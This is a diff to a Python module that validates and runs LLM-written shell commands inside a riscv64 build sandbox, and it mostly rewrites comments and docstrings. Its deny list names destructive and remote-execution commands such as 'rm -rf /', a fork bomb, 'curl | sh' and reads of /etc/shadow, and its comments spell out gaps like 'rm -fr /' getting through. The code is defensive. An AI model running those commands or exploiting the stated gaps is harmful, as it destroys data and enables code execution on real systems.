@@ -9,10 +9,17 @@
 # SPDX-License-Identifier: MIT
 #############################################################################
 
-"""Low-level utilities for command execution and file I/O.
+"""Command execution and file I/O behind the sandbox boundary.
 
-Provides Docker-aware file and command operations together with
-safety validation of shell commands.
+Every shell command the agent runs funnels through
+:func:`execute_command`: the text passes :class:`CommandValidator`,
+runs inside the riscv64 container (``docker exec`` under QEMU, ssh +
+``podman exec`` on the native target) and is capped by an
+in-container ``timeout`` plus a host-side orphan kill. The container
+is the real security boundary; the validator is an
+anti-hallucination guard for LLM-authored command text, not a jail.
+This module also writes files and applies unified diffs inside the
+sandbox.
 """
 
 import logging
@@ -35,12 +42,14 @@ from src.target import is_native
 logger = logging.getLogger(__name__)
 
 
-# ============================================================================
-# COMMAND VALIDATION
-# ============================================================================
+# Command validation
 
 
-# Environment variables whose VALUE must never appear in a process
+# Environment variables whose value must never appear in an argv,
+# where ``ps``, ``docker inspect`` or a log line would leak it.
+# sandbox.build_exec_argv passes a matching key by name only: the
+# container CLI reads the value from its own environment, and on the
+# native target the value travels on the ssh session's stdin.
 _SECRET_ENV_MARKERS = (
     "TOKEN",
     "SECRET",
@@ -49,7 +58,7 @@ _SECRET_ENV_MARKERS = (
     "API_KEY",
     "AUTH",
     "CREDENTIAL",
-    "GIT_CONFIG_VALUE",
+    "GIT_CONFIG_VALUE",  # carries the clone token (src/scripted_ops.py)
 )
 
 
@@ -255,7 +264,12 @@ def masks_failure(command: str) -> Optional[str]:
 
 
 def _or_tail_masks_failure(segment: str, words: list) -> bool:
-    """Return True when the right side of ``||`` exits successfully."""
+    """Return True when the right side of ``||`` exits successfully.
+
+    Only a plain command is recognized (``true``, ``echo``,
+    ``exit 0`` and friends); a group (``{ …; }`` or ``(…)``) is not
+    opened.
+    """
     if not words:
         return False
     first = words[0]
@@ -279,12 +293,17 @@ def _trailing_success_segment(words: list) -> bool:
 
 
 class CommandValidator:
-    """Smart command validation that allows legitimate operations.
+    """Whitelist validation for command text that runs in the sandbox.
 
-    Uses a whitelist approach: explicitly allow safe patterns and
-    block dangerous ones. Validation is per SEGMENT (see
-    :meth:`split_segments`) so a chained tail cannot ride along on an
-    approved first token.
+    The untrusted input is LLM-authored build and fix commands, which
+    can embed text from the cloned repository. Validation is per
+    SEGMENT (see :meth:`split_segments`) so a chained tail cannot
+    ride along on an approved first token, and command substitutions
+    and wrapper commands (``sh -c``, ``env``, ``timeout``, ``flock``,
+    ``xargs``) recurse through the same checks.
+
+    This is an anti-hallucination guard, not a jail: the sandbox
+    container stays the security boundary for anything that passes.
     """
 
     # Allowed command patterns (whitelist)
@@ -298,7 +317,7 @@ class CommandValidator:
         r"^tree\s+",
         r"^file\s+",
         r"^stat\s+",
-        # Search operations (FIXED: Previously blocked!)
+        # Search operations
         r"^grep\s+(-[a-zA-Z]+\s+)*",  # grep with optional flags
         r"^awk\s+",
         r"^sed\s+",
@@ -318,7 +337,8 @@ class CommandValidator:
         # ./config, ./buildconf, ./buildconf.sh, ./autogen.sh,
         # ./bootstrap[.sh], ./setup, etc. Some upstreams (openssl, curl)
         # ship driver scripts without extensions so we keep the suffix
-        # optional.
+        # optional. The pattern accepts any `./<name>` that starts with
+        # a letter, so it also runs a program that the build made.
         r"^\./[A-Za-z][A-Za-z0-9_.-]*(\s+.*)?$",
         r"^autoreconf(\s+.*)?$",
         r"^autoconf(\s+.*)?$",
@@ -341,9 +361,13 @@ class CommandValidator:
         r"^apk\s+",
         r"^yum\s+",
         r"^dnf\s+",
-        # File downloads (without piping to shell)
-        r"^wget\s+(?!.*\|\s*(bash|sh|zsh|fish))",  # wget but not wget | shell
-        r"^curl\s+(?!.*\|\s*(bash|sh|zsh|fish))",  # curl but not curl | shell
+        # File downloads; a download piped into a shell would be
+        # remote code execution. is_safe matches each segment after
+        # the split, so the lookahead sees only a quoted or escaped
+        # pipe. DANGEROUS_PATTERNS blocks the cross-segment form only
+        # for `wget … | bash` and `curl … | sh`.
+        r"^wget\s+(?!.*\|\s*(bash|sh|zsh|fish))",
+        r"^curl\s+(?!.*\|\s*(bash|sh|zsh|fish))",
         # Git operations
         r"^git\s+",
         # Compilation
@@ -372,24 +396,23 @@ class CommandValidator:
         r"^env\s+",
         r"^nice(\s+.*)?$",
         r"^nohup\s+",
-        # Variable assignments. Lower-case names are allowed because
-        # internal helper scripts use them (e.g. `_rc=$?` in the static
-        # archive probe); segment validation makes this safe.
+        # Variable assignments, lower-case names included; segment
+        # validation makes this safe.
         r"^[A-Za-z_][A-Za-z0-9_.]*=.*",
         r"^sh\s+",
         r"^bash\s+",
         r"^set\s+-[a-zA-Z]+$",  # `set -e` in bootstrap scripts
-        r"^exit\s+\$?[A-Za-z0-9_]*$",  # `exit $_rc`
+        r"^exit\s+\$?[A-Za-z0-9_]*$",  # `exit 1` or `exit $rc`
         r"^true$",  # no-op left by _strip_bundled_toolchain_packages
         # Segment-position helpers: these appear AFTER a pipe in
         # internally-constructed commands and must validate on their
-        # own now that every segment is checked.
+        # own because every segment is checked.
         r"^xargs(\s+.*)?$",
         r"^head(\s+.*)?$",
         r"^tail(\s+.*)?$",
         r"^wc(\s+.*)?$",
         r"^tr\s+",
-        r"^ar\s+[a-z]+\s+",  # `ar x <archive>` (static-lib arch probe)
+        r"^ar\s+[a-z]+\s+",  # `ar x <archive>`
         r"^flock\s+",  # pkg-manager serialization wrapper
         r"^timeout\s+",  # in-container runaway guard
         # System
@@ -401,7 +424,7 @@ class CommandValidator:
         r"^unzip\s+",
         r"^cp\s+",
         r"^mv\s+",
-        r"^rm\s+",  # DANGEROUS_PATTERNS block only truly dangerous forms
+        r"^rm\s+",  # DANGEROUS_PATTERNS block only `rm -rf /` and `/*`
         # Discovery
         r"^which\s+",
         r"^uname\s+",
@@ -438,6 +461,7 @@ class CommandValidator:
         # not a path with a real subdirectory like
         # `/workspace/repos/foo`. Any character in the class ``\s``,
         # ``*`` or end-of-line following the ``/`` means it stayed root.
+        # Only the `-rf` spelling matches: `rm -fr /` passes.
         r"rm\s+-rf\s+/(?:\s|$|\*)",
         r":\(\)\{\s*:\|:\&\s*\}",  # Fork bomb
         r"dd\s+if=/dev/zero\s+of=/dev/sd",  # Disk wipe
@@ -445,22 +469,22 @@ class CommandValidator:
         r"fdisk",  # Partition editing
         r"wget.*\|\s*bash",  # Remote code execution
         r"curl.*\|\s*sh",  # Remote code execution
-        r"\beval\s+",  # Eval is dangerous (word-boundary, see below)
-        # NOTE: `exec` is NOT blocked outright because
-        # `find … -exec sed -i {} \;` is a very common (and safe)
-        # refactor pattern emitted by the fixer. Truly dangerous use of
-        # `exec` is already covered by other blocks (no
-        # shell-redirect-exec, no remote pipe, etc.). Observed root
-        # cause for ecoji, garble, go-fasttld failures on 2026-05-23.
-        r"(?:^|\s|;|&)exec\s+\S+",  # bare `exec foo` at start of cmd
+        # eval runs data as shell code; the \b keeps words such as
+        # "retrieval" from matching.
+        r"\beval\s+",
+        # `exec` is not blocked outright: `find … -exec sed -i {} \;`
+        # is a common, safe fixer pattern, and its "-" prefix never
+        # matches. Only a BARE `exec foo` (at the start of the text, or
+        # after whitespace, `;` or `&`) is blocked; observed as the root
+        # cause of the ecoji, garble and go-fasttld failures on
+        # 2026-05-23.
+        r"(?:^|\s|;|&)exec\s+\S+",
         r"/etc/shadow",  # System files
         r"/etc/passwd",  # System files
         # Container swap fiddling (host-only, never appropriate).
         r"mkswap\s+|swapon\s+",
-        # ------------------------------------------------------------------
         # Container-poisoning guards (run 28020958388: one poisoned
         # container broke 34 subsequent packages on the same worker).
-        # ------------------------------------------------------------------
         # Uninstalling packages via the distro manager (autoremove,
         # remove, purge) can silently drop `git`, `ca-certificates`, and
         # other transitive deps we rely on. The base image ships every
@@ -473,8 +497,8 @@ class CommandValidator:
         # container-poisoning vector — an LLM adds a broken third-party
         # repo (e.g. `deb.debian.org/debian-ports stable`) and every
         # subsequent `apt-get update` explodes for the rest of the
-        # worker's lifetime. Refuse any redirect (`>`, `>>`, `tee -a`)
-        # into the apt/apk source lists directories.
+        # worker's lifetime. Refuse any redirect (`>`, `>>`, `tee`,
+        # `tee -a`) into the apt/apk source lists directories.
         (
             r"(?:>|>>|tee(?:\s+-a)?\s+)"
             r"\s*/etc/apt/(?:sources\.list|sources\.list\.d/)"
@@ -533,8 +557,8 @@ class CommandValidator:
                 i += 2
                 continue
             # Redirections, not operators: 2>&1, >&2, &>log, >|log.
-            # Splitting them left a segment "1" that no pattern allows,
-            # so every command with 2>&1 was refused.
+            # Splitting on their "&"/"|" would leave a bare "1"
+            # segment that no whitelist pattern allows.
             if (
                 (ch == "&" and buf and buf[-1] in "<>")
                 or command.startswith("&>", i)
@@ -561,16 +585,22 @@ class CommandValidator:
     def is_safe(
         self, command: str, _depth: int = 0, _context: str = "command"
     ) -> Tuple[bool, str]:
-        """Check if a command is safe to execute.
+        """Check that every part of a command is safe to execute.
 
-        EVERY segment of a chained command must match the whitelist.
-        Matching only the first token (the old behaviour) approved the
-        whole line, so ``make ; wget http://evil -O /tmp/x`` passed
-        because the ``make`` pattern's trailing wildcard consumed the
-        ``;`` tail.
+        EVERY segment of a chained command must match the whitelist,
+        and nested commands recurse (see :meth:`_validate_nested`).
+        Checking only the first token would approve
+        ``make ; wget http://evil -O /tmp/x``, because the ``make``
+        pattern's trailing wildcard consumes the ``;`` tail.
+
+        Args:
+            command: The raw command text.
+            _depth: Recursion depth of nested validation.
+            _context: What is being checked, for the reason string.
 
         Returns:
-            (is_safe, reason)
+            (is_safe, reason); the reason names the offending segment
+            when a chain is rejected.
         """
         if _depth > 5:
             return False, f"Validation nesting is too deep in {_context}"
@@ -597,10 +627,10 @@ class CommandValidator:
                     f"Unknown command segment (consider adding to "
                     f"whitelist): {segment[:100]}"
                 )
-                # Keep the historical wording for a plain (single
-                # command) rejection; only name the offending segment
-                # when the rejection came from a chain, where saying
-                # WHICH part failed is the useful information.
+                # Keep the exact wording for a plain (single command)
+                # rejection; tests assert it. Only name the offending
+                # segment when the rejection came from a chain, where
+                # saying WHICH part failed is the useful information.
                 if len(segments) == 1:
                     return False, "Unknown command pattern (not in whitelist)"
                 return (
@@ -613,7 +643,14 @@ class CommandValidator:
     def _validate_nested(
         self, segment: str, depth: int
     ) -> Tuple[bool, str]:
-        """Validate commands hidden inside one shell segment."""
+        """Validate commands hidden inside one shell segment.
+
+        Command substitutions (``$(…)``, backticks, a non-arithmetic
+        ``$((…))``), a command after an assignment prefix and wrapper
+        commands (``sh -c``, ``env``, ``timeout``, ``flock``,
+        ``xargs``, ``nice``/``nohup``) each recurse into
+        :meth:`is_safe` with a bounded recursion depth.
+        """
         for label, inner in self._extract_substitutions(segment):
             ok, reason = self.is_safe(inner, depth + 1, label)
             if not ok:
@@ -894,7 +931,9 @@ class CommandValidator:
         Stricter than :meth:`is_safe`: on top of per-segment whitelist
         checks, the command may contain at most one real invocation,
         optionally preceded by a ``cd <dir> &&`` prefix (the idiom the
-        prompts teach). Chaining, piping and redirection are refused.
+        prompts teach). Any separator after that ``cd`` segment passes,
+        for example ``cd <dir>; make``. Other chaining, piping and
+        redirection are refused.
 
         Rationale: fixer/investigation commands are supposed to be one
         build or inspection step. Allowing chains lets an LLM — whose
@@ -931,13 +970,10 @@ class CommandValidator:
         return True, "Single safe invocation"
 
 
-# Global validator instance
 _validator = CommandValidator()
 
 
-# ============================================================================
-# DOCKER CONFIGURATION
-# ============================================================================
+# Docker configuration
 
 
 class _DockerConfigMeta(type):
@@ -949,16 +985,23 @@ class _DockerConfigMeta(type):
     """
 
     @property
-    def CONTAINER_NAME(cls) -> str:  # noqa: N802
+    def CONTAINER_NAME(cls) -> str:  # noqa: N802 - attribute-style API
         from src.platforms import get_container_name
 
         return get_container_name()
 
 
 class DockerConfig(metaclass=_DockerConfigMeta):
-    """Docker container configuration. CONTAINER_NAME is profile-driven."""
+    """Docker container configuration.
 
-    WORKSPACE_PATH = "/workspace"  # Path inside container
+    Attributes:
+        CONTAINER_NAME: Resolved at access time from the active
+            platform profile (the ``ATESOR_CONTAINER`` override wins),
+            so a profile switch retargets later commands.
+        WORKSPACE_PATH: The workspace root inside the container.
+    """
+
+    WORKSPACE_PATH = "/workspace"
 
     @staticmethod
     def is_container_running() -> bool:
@@ -984,9 +1027,7 @@ class DockerConfig(metaclass=_DockerConfigMeta):
             return False
 
 
-# ============================================================================
-# COMMAND EXECUTION
-# ============================================================================
+# Command execution
 
 
 def execute_command(
@@ -997,25 +1038,46 @@ def execute_command(
     use_docker: bool = True,
     extra_env: Optional[dict] = None,
 ) -> CommandResult:
-    """Execute a shell command safely.
+    """Execute a shell command, inside the sandbox by default.
+
+    This is the single gateway for all shell work. With ``validate``,
+    the command must pass :class:`CommandValidator`. With
+    ``use_docker``, it runs in the build container (``docker exec``
+    under QEMU; one ssh call plus ``podman exec`` on the native
+    target). Package-manager commands are name-corrected for the
+    active distro, stripped of bundled Go/Rust toolchain packages and
+    serialized with ``flock``. Two timeouts apply: an in-container
+    ``timeout --signal=KILL`` (``timeout`` - 30 s, at least 10 s)
+    fires first, so a killed command still returns its captured
+    output; the host-side call caps the whole exchange, and after a
+    host timeout a best-effort ``pkill`` reaps orphaned processes. A
+    package-manager command that loses the database lock is retried
+    with backoff.
 
     Args:
-        command: Shell command to execute. Accepts either a ``str`` (run
-            through the shell) or a ``list[str]`` (argv form; joined for
-            docker exec, passed as ``shell=False`` on the host).
-        cwd: Working directory (translated to a container path when
-            ``use_docker`` is True).
-        timeout: Timeout in seconds.
-        validate: Whether to validate command safety.
-        use_docker: Whether to execute in the Docker container.
-            Defaults to True.
-        extra_env: Additional environment variables exported for the
-            command. Applied inside the container via ``docker exec
-            --env`` and on the host via a merged ``env`` dict. Values
-            already present in the process environment are overridden.
+        command: Shell command to execute. Accepts either a ``str``
+            (run through the shell) or a ``list[str]`` (each element
+            is ``shlex.quote``d and joined, so metacharacters stay
+            literal).
+        cwd: Working directory; a path under the host workspace is
+            translated to the container path.
+        timeout: Maximum run time in seconds.
+        validate: Whether to run the safety whitelist. Keep it True
+            for any LLM- or repo-derived text; False is reserved for
+            fixed constants built by this codebase.
+        use_docker: Whether to execute in the sandbox container.
+        extra_env: Extra environment for the command; values override
+            the inherited environment. A key whose name looks secret
+            travels by name only (see ``_SECRET_ENV_MARKERS``).
 
     Returns:
-        A ``CommandResult`` with output and status.
+        A ``CommandResult``. A blocked command has exit code 1 with
+        the reason in ``stderr``; a timeout or an unexpected error
+        has exit code -1.
+
+    Raises:
+        SandboxUnavailableError: When the sandbox is unreachable; the
+            graph escalates instead of misreading it as a build error.
     """
     from src.config import _IN_DOCKER, WORKSPACE_ROOT
 
@@ -1035,7 +1097,6 @@ def execute_command(
     if _IN_DOCKER and not native:
         use_docker = False
 
-    # Validate command safety
     if validate:
         is_safe, reason = _validator.is_safe(command)
         if not is_safe:
@@ -1054,10 +1115,9 @@ def execute_command(
         command = _fix_pkg_names(command)
         command = _strip_bundled_toolchain_packages(command)
 
-    # Execute command
     host_env = None
     try:
-        # FIXED: Execute in Docker container by default
+        # Run in the sandbox container (the default path).
         if use_docker:
             # On native, this probe would cost one more ssh call. The
             # podman error of the command reports it instead (see below).
@@ -1077,30 +1137,25 @@ def execute_command(
                     duration_seconds=0.0,
                 )
 
-            # Per-call environment overrides (fail-fast git flags,
-            # locale, tokens) go to build_exec_argv(). It passes a
-            # secret by name only, never its value in an argv.
             container_cwd = None
 
-            # Add working directory if specified
             if cwd:
-                # Translate host path to container path if necessary
+                # Translate a host path to the container path.
                 container_cwd = cwd
                 if cwd.startswith(str(WORKSPACE_ROOT)):
                     container_cwd = cwd.replace(
                         str(WORKSPACE_ROOT), DockerConfig.WORKSPACE_PATH
                     )
                 elif not cwd.startswith(DockerConfig.WORKSPACE_PATH):
-                    # If it's not relative and not in /workspace, it
-                    # might be an absolute host path; try to see if it
-                    # contains 'workspace'.
+                    # An absolute host path outside WORKSPACE_ROOT is
+                    # mapped by its "workspace" tail; a path without
+                    # one goes to the container unchanged.
                     if "workspace" in cwd:
                         parts = cwd.split("workspace", 1)
                         container_cwd = DockerConfig.WORKSPACE_PATH + parts[1]
 
-            # Add container name and command.
-            # Wrap package-manager commands with flock to serialize
-            # across concurrent agents.
+            # Serialize package-manager commands with flock: two runs
+            # that use one container share one apk/apt database.
             exec_command = command
             if _is_pkg_command(command):
                 import shlex as _shlex
@@ -1121,6 +1176,9 @@ def execute_command(
                 f"bash -c '{shell_quoted}'"
             )
             container = DockerConfig.CONTAINER_NAME
+            # Per-call environment overrides (fail-fast git flags,
+            # locale, tokens) go to build_exec_argv(). It passes a
+            # secret by name only, never its value in an argv.
             call = sandbox.build_exec_argv(
                 container,
                 ["bash", "-c", exec_command],
@@ -1139,6 +1197,9 @@ def execute_command(
             if native:
                 # Handles the ssh transport errors; see src/sandbox.py.
                 result = _run_native_call(call, timeout)
+                # podman exec exits 125 for a missing container and
+                # 255 for a stopped one; the error text decides (see
+                # src/sandbox.py).
                 if sandbox.not_running(result.returncode, result.stderr):
                     message = f"Container '{container}' is not running"
                     logger.error(message)
@@ -1160,7 +1221,8 @@ def execute_command(
                     env=host_env,
                 )
         else:
-            # Execute on host (for git clone, etc.)
+            # Execute on the host: use_docker is False, or Atesor
+            # itself runs in Docker.
             logger.debug(f"Executing on host: {command[:100]}")
 
             if extra_env:
@@ -1185,8 +1247,7 @@ def execute_command(
             logger.debug(f"Command succeeded: {command[:50]}...")
         else:
             # Retry package-manager commands that fail due to database
-            # lock contention (common when multiple agents share one
-            # container in batch mode).
+            # lock contention (when two runs use one container).
             if _is_pkg_lock_error(result) and _is_pkg_command(command):
                 pkg_lock_retries = 5
                 for retry in range(1, pkg_lock_retries + 1):
@@ -1210,7 +1271,8 @@ def execute_command(
                             errors="replace",
                             timeout=timeout,
                             # Preserve extra_env on host retries; docker
-                            # retries carry it inside docker_cmd already.
+                            # retries carry it inside docker_cmd, and
+                            # host_env holds the secret values.
                             env=host_env,
                         )
                     if not _is_pkg_lock_error(retry_result):
@@ -1243,7 +1305,7 @@ def execute_command(
 
         # Belt-and-braces: even though we wrap with `timeout --signal=KILL`
         # in-container, also try to kill any matching process from the host so
-        # we never leave qemu-emulated builds running forever after a timeout.
+        # we never leave a build (QEMU or native) running after a timeout.
         # This is best-effort and never raises.
         if use_docker:
             try:
@@ -1382,7 +1444,8 @@ _BUNDLED_TOOLCHAIN_TOKENS = (
     ),  # golang, golang-go, golang-1.21, golang-1.18-go, ...
     re.compile(r"^go-1\.[0-9]+$"),  # go-1.21, go-1.22, ...
     re.compile(r"^gccgo(-[a-z0-9.\-]+)?$"),  # gccgo, gccgo-12, ...
-    # Rust is now baked into BOTH images via rustup (see the
+    # Rust is baked into every sandbox image (Dockerfile,
+    # Dockerfile.debian, Dockerfile.native) via rustup (see the
     # RUST_TOOLCHAIN ARG). Installing the distro package puts an older
     # rustc ahead of ~/.cargo/bin on PATH and reintroduces the
     # "rustc <old> is not supported by the following packages" failure
@@ -1394,14 +1457,15 @@ _BUNDLED_TOOLCHAIN_TOKENS = (
 
 
 def _strip_bundled_toolchain_packages(command: str) -> str:
-    """Strip bundled Go toolchain packages from an install command.
+    """Strip bundled Go and Rust toolchain packages from an install command.
 
-    Removes ``golang*`` / ``gccgo*`` / ``go-1.*`` tokens from any
-    package-manager ``install`` command. The sandbox images bake a
-    current ``go`` toolchain at ``/usr/local/go``; installing the distro
-    package replaces ``/usr/bin/go`` with an outdated copy and breaks
-    every modern Go build (observed root cause for ~25 % of Debian
-    batch failures).
+    Removes ``golang*`` / ``gccgo*`` / ``go-1.*`` and ``rust*`` /
+    ``rustc*`` / ``cargo*`` tokens (see ``_BUNDLED_TOOLCHAIN_TOKENS``)
+    from any package-manager ``install`` command. The sandbox images
+    bake a current ``go`` toolchain at ``/usr/local/go``; installing the
+    distro package replaces ``/usr/bin/go`` with an outdated copy and
+    breaks every modern Go build (observed root cause for ~25 % of
+    Debian batch failures).
 
     Only the install verb is touched (``apk add``, ``apt-get install``,
     ``apt install``). If stripping leaves the install with no packages,
@@ -1432,7 +1496,7 @@ def _strip_bundled_toolchain_packages(command: str) -> str:
         r"(install|add)\s+"  # 3: verb
         # 4: post-verb flags.
         r"((?:-{1,2}[A-Za-z0-9][A-Za-z0-9-]*(?:=\S+)?\s+)*)"
-        r"([^&|;]+?)"  # 5: package list (greedy w/in clause)
+        r"([^&|;]+?)"  # 5: package list (lazy, up to the separator)
         r"(?=\s*(?:&&|\|\||;|$))",
         re.IGNORECASE,
     )
@@ -1480,30 +1544,30 @@ def _strip_bundled_toolchain_packages(command: str) -> str:
     return install_re.sub(_rewrite, command)
 
 
-# ============================================================================
-# FILE OPERATIONS
-# ============================================================================
+# File operations
 
 
 def write_file(filepath: str, content: str, use_docker: bool = True) -> bool:
-    """Write content to file.
+    """Write text to a file, inside the sandbox by default.
 
     Args:
-        filepath: Path to file
-        content: Content to write
-        use_docker: Whether to write in Docker container
+        filepath: The destination path; a container path unless
+            ``use_docker`` is False. In the container, the parent
+            directory is created.
+        content: The text to write.
+        use_docker: Write inside the container (True) or on the host.
 
     Returns:
-        Success status
+        True when the write succeeded.
     """
     if use_docker:
-        # Write to Docker container using base64 for robustness
+        # base64 survives the shell pipeline untouched: arbitrary
+        # content reaches the container without quoting accidents.
         import base64
         import shlex
 
         encoded = base64.b64encode(content.encode("utf-8")).decode("ascii")
 
-        # Ensure directory exists
         dir_path = "/".join(filepath.split("/")[:-1])
         if dir_path:
             execute_command(
@@ -1516,7 +1580,6 @@ def write_file(filepath: str, content: str, use_docker: bool = True) -> bool:
         )
         return result.success
     else:
-        # Write to host
         try:
             with open(filepath, "w", encoding="utf-8") as f:
                 f.write(content)
@@ -1527,9 +1590,7 @@ def write_file(filepath: str, content: str, use_docker: bool = True) -> bool:
             return False
 
 
-# ============================================================================
-# PATCH OPERATIONS
-# ============================================================================
+# Patch operations
 
 
 def _convert_codex_envelope_to_unified_diff(
@@ -1661,17 +1722,25 @@ def apply_patch(
     cwd: Optional[str] = None,
     use_docker: bool = True,
 ) -> bool:
-    """Apply a patch to one or more files.
+    """Apply a patch to one or more files, in the sandbox by default.
+
+    A Codex/Aider ``*** Begin Patch`` envelope is converted to a
+    unified diff first; the fixer LLM emits them often. In the
+    container, without ``filepath`` the diff is dry-run with
+    ``patch -p1`` and retried with ``-p0`` before anything is applied.
+    On the host it is applied with ``patch -p1`` directly. Content
+    that is not a unified diff is rejected rather than appended: a raw
+    append can silently corrupt a source file.
 
     Args:
-        patch_content: Unified diff or content to append.
-        filepath: Specific file to patch. If None, assumes the unified
-            diff carries its own paths.
-        cwd: Working directory.
-        use_docker: Whether to run in Docker.
+        patch_content: A unified diff or a convertible envelope.
+        filepath: A specific file to patch; when None, the diff
+            carries its own paths.
+        cwd: The working directory for the ``patch`` call.
+        use_docker: Apply inside the container (True) or on the host.
 
     Returns:
-        The success status.
+        True when the patch applied.
     """
     if not patch_content:
         return False
@@ -1691,7 +1760,7 @@ def apply_patch(
             filepath = None
 
     if use_docker:
-        # Write patch to container's /tmp
+        # Stage the patch at a unique path in the container's /tmp.
         import uuid
 
         patch_filename = f"/tmp/agent_{uuid.uuid4().hex[:8]}.patch"
@@ -1719,8 +1788,8 @@ def apply_patch(
                     )
                     return False
             else:
-                # Standard unified diff - apply with -p1
-                # Try dry-run first
+                # Whole-tree diff: dry-run first so a patch that does
+                # not apply cleanly never touches the tree.
                 dry_run = execute_command(
                     f"patch -p1 --dry-run < {patch_filename}",
                     cwd=cwd,
@@ -1728,7 +1797,7 @@ def apply_patch(
                 )
                 if not dry_run.success:
                     logger.warning(f"Patch dry-run failed: {dry_run.stderr}")
-                    # Try p0 as fallback
+                    # Fall back to -p0 for diffs without a/ b/ prefixes.
                     dry_run = execute_command(
                         f"patch -p0 --dry-run < {patch_filename}",
                         cwd=cwd,
@@ -1785,7 +1854,6 @@ def apply_patch(
             return False
 
 
-# Export all functions
 __all__ = [
     "execute_command",
     "write_file",
